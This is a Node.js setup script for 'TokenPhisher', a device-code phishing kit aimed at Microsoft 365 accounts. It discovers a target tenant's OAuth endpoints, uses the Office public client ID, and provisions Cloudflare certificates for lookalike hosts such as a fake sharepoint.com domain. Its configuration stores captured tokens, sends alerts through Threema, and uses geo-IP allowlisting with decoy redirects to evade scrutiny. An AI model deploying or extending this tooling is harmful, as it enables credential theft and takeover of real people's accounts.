#!/usr/bin/env node

import fs from 'fs';
import path from 'path';
import os from 'os';
import { execFileSync } from 'child_process';
import { fileURLToPath } from 'url';
import { parseArgs } from 'util';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const ROOT = __dirname;
const SERVER_JS = path.join(ROOT, 'server.js');
const CONFIG_JSON = path.join(ROOT, 'config.json');
const LOCAL_CERTS_DIR = path.join(ROOT, 'certs');

const DEFAULT_CERT_STORE =
  process.env.TOKENPHISHER_CERT_STORE ||
  (process.getuid?.() === 0
    ? '/var/lib/tokenphisher/certs'
    : path.join(os.homedir(), '.local/share/tokenphisher/certs'));

const CLOUDFLARE_ORIGIN_CA =
  'https://developers.cloudflare.com/ssl/static/origin_ca_rsa_root.pem';

// Public Microsoft client ID (Office) — not published in OpenID discovery.
const DEFAULT_MS_CLIENT_ID = 'd3590ed6-52b3-4102-aeff-aad2292ab01c';

const DEFAULT_REDIRECT_URL = 'https://www.microsoft.com';
const DEFAULT_ALREADY_LOGGED_IN_URL = 'https://onedrive.live.com/';

const DEFAULT_CONFIG = {
  httpPort: 80,
  httpsPort: 443,
  testMode: false,
  debug: false,
  clientId: DEFAULT_MS_CLIENT_ID,
  tokenUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
  deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
  scopes: 'offline_access openid',
  phishingHTML: 'index.html',
  redirectUrl: DEFAULT_REDIRECT_URL,
  alreadyLoggedInURL: DEFAULT_ALREADY_LOGGED_IN_URL,
  cookieExpirationInDays: 90,
  userCodesFile: 'successful_user_code_cookies.txt',
  logFile: 'logfile.txt',
  tokenFile: 'tokens.txt',
  threemaOn: false,
  threemaTo: ['YourID1', 'YourID2'],
  threemaFrom: 'YourName',
  threemaURL: 'https://msgapi.threema.ch/send_simple',
  threemaSecret: 'PutYourSecretHere',
  keyFilePath: '/var/lib/tokenphisher/certs/example.com/privkey.pem',
  certFilePath: '/var/lib/tokenphisher/certs/example.com/cert.pem',
  caFilePath: '/var/lib/tokenphisher/certs/example.com/origin-ca.pem',
  userAgent:
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
  geoipallowlist: ['CH'],
};

function printHelp() {
  console.log(`TokenPhisher setup

Usage:
  node setup.mjs [options]

Required for production TLS (Cloudflare):
  --domain <hostname>           Phishing hostname / TLS cert name (e.g. share.example.com)
  --cf-token <token>            Cloudflare API token (or CLOUDFLARE_API_TOKEN env var)
                                Needs Account: Cloudflare Origin CA:Edit and Zone:Read

Microsoft OAuth (auto-configured from OpenID discovery):
  --tenant <domain>             Microsoft tenant domain (e.g. gipi.com). Auto-guessed from
                                --domain when it looks like *.sharepoint.* phishing hosts.

Common options:
  --cert-store <path>           Persistent cert directory (default: /var/lib/tokenphisher/certs as root)
  --force-renew                 Request a new certificate even if a valid one exists
  --redirect-url <url>          Override redirect for / and blocked geo IPs (default: microsoft.com)
  --already-logged-in-url <url> Override return-visitor redirect (default: onedrive.live.com)
  --geoip <codes>               Comma-separated ISO country codes (default: CH)
  --client-id <id>              Override OAuth client ID (default: MS Office public client)
  --scopes <scopes>             OAuth scopes (space-separated)
  --debug                       Enable debug logging
  --test-mode                   HTTP only, no TLS (local testing)
  --config-only                 Update config without provisioning TLS
  --from-config <file>          Load values from an existing JSON config file
  --help                        Show this help

Examples:
  CLOUDFLARE_API_TOKEN=xxx node setup.mjs \\
    --domain gipi.sharepoint.com.documents.v06.zip \\
    --tenant gipi.com

  node setup.mjs --test-mode --tenant contoso.com

Microsoft setup notes:
  - tokenUrl and deviceCodeUrl are fetched from /.well-known/openid-configuration.
  - clientId uses the standard MS Office public client (not in OpenID discovery).
  - Branded tenant login page is shown when tenant-specific endpoints are used.

Cloudflare setup notes:
  - Domain must already use Cloudflare DNS (orange-cloud proxy recommended).
  - openssl must be installed (apt install openssl) — the API requires a CSR.
  - Certs are stored outside the app (default: /var/lib/tokenphisher/certs/<domain>/).
  - Re-running setup reuses existing certs unless --force-renew is passed.
  - config.json is written with absolute cert paths and server.js is updated automatically.
`);
}

function sanitizeHostname(hostname) {
  return hostname.replace(/[^a-zA-Z0-9._-]/g, '_');
}

function certStoreDir(certStoreRoot, hostname) {
  return path.join(certStoreRoot, sanitizeHostname(hostname));
}

function certFilePaths(storeDir) {
  return {
    keyFilePath: path.join(storeDir, 'privkey.pem'),
    certFilePath: path.join(storeDir, 'cert.pem'),
    caFilePath: path.join(storeDir, 'origin-ca.pem'),
    metaFilePath: path.join(storeDir, 'cert-meta.json'),
  };
}

function certPathsForConfig(storeDir) {
  const paths = certFilePaths(storeDir);
  return {
    keyFilePath: paths.keyFilePath,
    certFilePath: paths.certFilePath,
    caFilePath: paths.caFilePath,
  };
}

function getCertExpiry(certPath) {
  const output = execFileSync(
    'openssl',
    ['x509', '-enddate', '-noout', '-in', certPath],
    { encoding: 'utf8' }
  );
  return new Date(output.replace('notAfter=', '').trim());
}

function existingCertsAreUsable(storeDir, minDaysRemaining = 30) {
  const paths = certFilePaths(storeDir);
  if (!fs.existsSync(paths.keyFilePath) || !fs.existsSync(paths.certFilePath)) {
    return null;
  }

  try {
    const expiresAt = getCertExpiry(paths.certFilePath);
    const daysRemaining = (expiresAt - Date.now()) / (1000 * 60 * 60 * 24);
    if (daysRemaining < minDaysRemaining) {
      return null;
    }
    return { expiresAt, daysRemaining: Math.floor(daysRemaining) };
  } catch {
    return null;
  }
}

function migrateLocalCertsIfNeeded(hostname, storeDir) {
  const localPaths = certFilePaths(LOCAL_CERTS_DIR);
  const storePaths = certFilePaths(storeDir);

  if (fs.existsSync(storePaths.certFilePath)) {
    return;
  }
  if (!fs.existsSync(localPaths.certFilePath) || !fs.existsSync(localPaths.keyFilePath)) {
    return;
  }

  console.log(`Migrating existing ./certs/ to ${storeDir} ...`);
  fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });
  for (const filePath of [localPaths.keyFilePath, localPaths.certFilePath, localPaths.caFilePath]) {
    if (fs.existsSync(filePath)) {
      fs.copyFileSync(filePath, path.join(storeDir, path.basename(filePath)));
    }
  }
  fs.chmodSync(storePaths.keyFilePath, 0o600);
}

function writeCertMetadata(storeDir, hostname, hostnames, expiresAt) {
  const meta = {
    hostname,
    hostnames,
    provider: 'cloudflare-origin-ca',
    createdAt: new Date().toISOString(),
    expiresAt: expiresAt.toISOString(),
  };
  fs.writeFileSync(certFilePaths(storeDir).metaFilePath, JSON.stringify(meta, null, 2) + '\n', {
    mode: 0o644,
  });
}

function parseGeoip(value) {
  return value
    .split(',')
    .map((code) => code.trim().toUpperCase())
    .filter(Boolean);
}

function guessMicrosoftTenantCandidates(phishingDomain) {
  const candidates = [];
  const sharepointMatch = phishingDomain.match(/^([^.]+)\.sharepoint\./i);
  if (sharepointMatch) {
    const org = sharepointMatch[1].toLowerCase();
    candidates.push(`${org}.com`, `${org}.onmicrosoft.com`);
  }

  const zone = zoneNameFromHostname(phishingDomain);
  if (zone && !candidates.includes(zone)) {
    candidates.push(zone);
  }

  return [...new Set(candidates)];
}

function tenantIdFromIssuer(issuer) {
  const match = issuer?.match(/login\.microsoftonline\.com\/([^/]+)\//i);
  return match?.[1] ?? null;
}

async function fetchMicrosoftOpenIdConfig(tenant) {
  const url = `https://login.microsoftonline.com/${encodeURIComponent(tenant)}/v2.0/.well-known/openid-configuration`;
  const response = await fetch(url);
  if (!response.ok) {
    throw new Error(`HTTP ${response.status} for tenant "${tenant}"`);
  }

  const discovery = await response.json();
  if (!discovery.token_endpoint || !discovery.device_authorization_endpoint) {
    throw new Error(`OpenID discovery for "${tenant}" is missing required endpoints`);
  }

  return {
    tenant,
    tenantId: tenantIdFromIssuer(discovery.issuer),
    tokenUrl: discovery.token_endpoint,
    deviceCodeUrl: discovery.device_authorization_endpoint,
    issuer: discovery.issuer,
  };
}

async function discoverMicrosoftOAuth({ tenant, phishingDomain }) {
  const candidates = tenant
    ? [tenant]
    : phishingDomain
      ? guessMicrosoftTenantCandidates(phishingDomain)
      : [];

  if (!candidates.length) {
    return null;
  }

  const failures = [];
  for (const candidate of candidates) {
    try {
      const result = await fetchMicrosoftOpenIdConfig(candidate);
      return result;
    } catch (error) {
      failures.push(`${candidate}: ${error.message}`);
    }
  }

  throw new Error(
    `Could not discover Microsoft tenant OAuth endpoints.\n` +
      `Tried: ${failures.join('; ')}\n` +
      `Pass --tenant explicitly (e.g. --tenant gipi.com).`
  );
}

function applyMicrosoftOAuthConfig(config, discovery) {
  config.tokenUrl = discovery.tokenUrl;
  config.deviceCodeUrl = discovery.deviceCodeUrl;
  config.microsoftTenant = discovery.tenant;
  config.microsoftTenantId = discovery.tenantId;
}

async function cloudflareRequest(token, method, endpoint, body) {
  const response = await fetch(`https://api.cloudflare.com/client/v4${endpoint}`, {
    method,
    headers: {
      Authorization: `Bearer ${token}`,
      'Content-Type': 'application/json',
    },
    body: body ? JSON.stringify(body) : undefined,
  });

  const data = await response.json();
  if (!response.ok || !data.success) {
    const errors = data.errors?.map((e) => e.message).join('; ') || response.statusText;
    throw new Error(`Cloudflare API error: ${errors}`);
  }
  return data.result;
}

function zoneNameFromHostname(hostname) {
  const parts = hostname.split('.').filter(Boolean);
  if (parts.length <= 2) {
    return hostname;
  }
  return parts.slice(-2).join('.');
}

async function getZoneId(token, hostname) {
  const zoneName = zoneNameFromHostname(hostname);
  const zones = await cloudflareRequest(token, 'GET', `/zones?name=${encodeURIComponent(zoneName)}`);
  if (!zones?.length) {
    throw new Error(
      `No Cloudflare zone found for "${zoneName}". Add the domain to Cloudflare first.`
    );
  }
  return { zoneId: zones[0].id, zoneName: zones[0].name };
}

function generateKeyAndCsr(hostnames) {
  const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'tokenphisher-'));
  const keyPath = path.join(tmpDir, 'key.pem');
  const csrPath = path.join(tmpDir, 'csr.pem');
  const configPath = path.join(tmpDir, 'openssl.cnf');
  const cn = hostnames[0];

  const altNames = hostnames.map((h, i) => `DNS.${i + 1} = ${h}`).join('\n');
  fs.writeFileSync(
    configPath,
    `[req]
distinguished_name = req_distinguished_name
req_extensions = v3_req
prompt = no

[req_distinguished_name]
CN = ${cn}

[v3_req]
subjectAltName = @alt_names

[alt_names]
${altNames}
`
  );

  try {
    execFileSync('openssl', ['genrsa', '-out', keyPath, '2048'], { stdio: 'pipe' });
    execFileSync(
      'openssl',
      ['req', '-new', '-key', keyPath, '-out', csrPath, '-config', configPath],
      { stdio: 'pipe' }
    );
  } catch {
    throw new Error(
      'openssl is required to generate a CSR for Cloudflare origin certificates. Install with: apt install openssl'
    );
  }

  const privateKey = fs.readFileSync(keyPath, 'utf8');
  const csr = fs.readFileSync(csrPath, 'utf8');
  fs.rmSync(tmpDir, { recursive: true, force: true });
  return { privateKey, csr };
}

async function provisionCloudflareOriginCert(token, hostname, certStoreRoot, forceRenew) {
  const storeDir = certStoreDir(certStoreRoot, hostname);
  migrateLocalCertsIfNeeded(hostname, storeDir);

  const existing = existingCertsAreUsable(storeDir);
  if (existing && !forceRenew) {
    console.log(
      `Reusing existing certificate from ${storeDir} (expires ${existing.expiresAt.toISOString()}, ${existing.daysRemaining} days left)`
    );
    return certPathsForConfig(storeDir);
  }

  if (!token) {
    throw new Error(
      `No valid certificate found in ${storeDir}. Provide --cf-token or CLOUDFLARE_API_TOKEN to create one.`
    );
  }

  console.log(`Provisioning Cloudflare origin certificate for ${hostname} ...`);

  const { zoneName } = await getZoneId(token, hostname);

  const hostnames =
    hostname === zoneName
      ? [zoneName, `*.${zoneName}`]
      : [hostname, `*.${zoneName}`];

  console.log('Generating private key and CSR locally ...');
  const { privateKey, csr } = generateKeyAndCsr(hostnames);

  const cert = await cloudflareRequest(token, 'POST', '/certificates', {
    hostnames,
    requested_validity: 5475,
    request_type: 'origin-rsa',
    csr,
  });

  fs.mkdirSync(storeDir, { recursive: true, mode: 0o700 });

  const paths = certFilePaths(storeDir);

  fs.writeFileSync(paths.keyFilePath, privateKey, { mode: 0o600 });
  fs.writeFileSync(paths.certFilePath, cert.certificate, { mode: 0o644 });

  const caResponse = await fetch(CLOUDFLARE_ORIGIN_CA);
  if (!caResponse.ok) {
    throw new Error(`Failed to download Cloudflare Origin CA: ${caResponse.statusText}`);
  }
  fs.writeFileSync(paths.caFilePath, await caResponse.text(), { mode: 0o644 });

  const expiresAt = getCertExpiry(paths.certFilePath);
  writeCertMetadata(storeDir, hostname, hostnames, expiresAt);

  console.log(`Certificates saved to ${storeDir}/ (valid until ${expiresAt.toISOString()})`);

  return certPathsForConfig(storeDir);
}

function formatConfigValue(key, value) {
  const serialized = JSON.stringify(value);
  if (key === 'clientId') {
    return `${serialized}, // MS public client ID`;
  }
  return `${serialized},`;
}

function updateServerJs(config) {
  if (!fs.existsSync(SERVER_JS)) {
    throw new Error(`server.js not found at ${SERVER_JS}`);
  }

  let content = fs.readFileSync(SERVER_JS, 'utf8');
  const lines = Object.entries(config).map(
    ([key, value]) => `    ${key}: ${formatConfigValue(key, value)}`
  );
  const newBlock = `const defaultConfig = {\n${lines.join('\n')}\n};`;

  const regex = /const defaultConfig = \{[\s\S]*?\n\};/;
  if (!regex.test(content)) {
    throw new Error('Could not find defaultConfig block in server.js');
  }

  content = content.replace(regex, newBlock);
  fs.writeFileSync(SERVER_JS, content);
  console.log('Updated server.js defaultConfig');
}

function writeConfigJson(config) {
  fs.writeFileSync(CONFIG_JSON, JSON.stringify(config, null, 2) + '\n');
  console.log(`Wrote ${CONFIG_JSON}`);
}

async function main() {
  const { values } = parseArgs({
    options: {
      domain: { type: 'string' },
      tenant: { type: 'string' },
      'cf-token': { type: 'string' },
      'redirect-url': { type: 'string' },
      'already-logged-in-url': { type: 'string' },
      geoip: { type: 'string' },
      'client-id': { type: 'string' },
      scopes: { type: 'string' },
      debug: { type: 'boolean', default: false },
      'test-mode': { type: 'boolean', default: false },
      'config-only': { type: 'boolean', default: false },
      'from-config': { type: 'string' },
      'cert-store': { type: 'string' },
      'force-renew': { type: 'boolean', default: false },
      help: { type: 'boolean', short: 'h', default: false },
    },
    allowPositionals: false,
  });

  if (values.help) {
    printHelp();
    return;
  }

  const config = structuredClone(DEFAULT_CONFIG);

  if (values['from-config']) {
    const imported = JSON.parse(fs.readFileSync(path.resolve(values['from-config']), 'utf8'));
    Object.assign(config, imported);
  }

  if (values['redirect-url']) config.redirectUrl = values['redirect-url'];
  if (values['already-logged-in-url']) config.alreadyLoggedInURL = values['already-logged-in-url'];
  if (values.geoip) config.geoipallowlist = parseGeoip(values.geoip);
  if (values['client-id']) config.clientId = values['client-id'];
  if (values.scopes) config.scopes = values.scopes;
  if (values.debug) config.debug = true;
  if (values['test-mode']) config.testMode = true;

  const cfToken = values['cf-token'] || process.env.CLOUDFLARE_API_TOKEN;
  const domain = values.domain;
  const tenant = values.tenant;
  const certStoreRoot = path.resolve(values['cert-store'] || DEFAULT_CERT_STORE);

  if (tenant || domain) {
    console.log('Discovering Microsoft OAuth endpoints from OpenID configuration ...');
    const discovery = await discoverMicrosoftOAuth({ tenant, phishingDomain: domain });
    if (discovery) {
      applyMicrosoftOAuthConfig(config, discovery);
      console.log(`Microsoft tenant: ${discovery.tenant} (${discovery.tenantId})`);
      console.log(`  tokenUrl: ${config.tokenUrl}`);
      console.log(`  deviceCodeUrl: ${config.deviceCodeUrl}`);
      console.log(`  clientId: ${config.clientId} (MS Office public client — override with --client-id)`);
    }
  }

  if (!values['test-mode'] && !values['config-only']) {
    if (!domain) {
      console.error('Error: --domain is required for TLS setup.');
      process.exit(1);
    }

    const certPaths = await provisionCloudflareOriginCert(
      cfToken,
      domain,
      certStoreRoot,
      values['force-renew']
    );
    Object.assign(config, certPaths);
    config.testMode = false;
  } else if (values['test-mode']) {
    config.testMode = true;
  }

  writeConfigJson(config);
  updateServerJs(config);

  console.log('\nSetup complete. Start the server with: npm start');
  if (config.testMode) {
    console.log(`Listening on HTTP port ${config.httpPort}`);
  } else {
    console.log(`Listening on HTTPS port ${config.httpsPort}`);
    console.log('Ensure Cloudflare SSL/TLS mode is Full (strict) for origin certificates.');
  }
}

main().catch((error) => {
  console.error(error.message || error);
  process.exit(1);
});
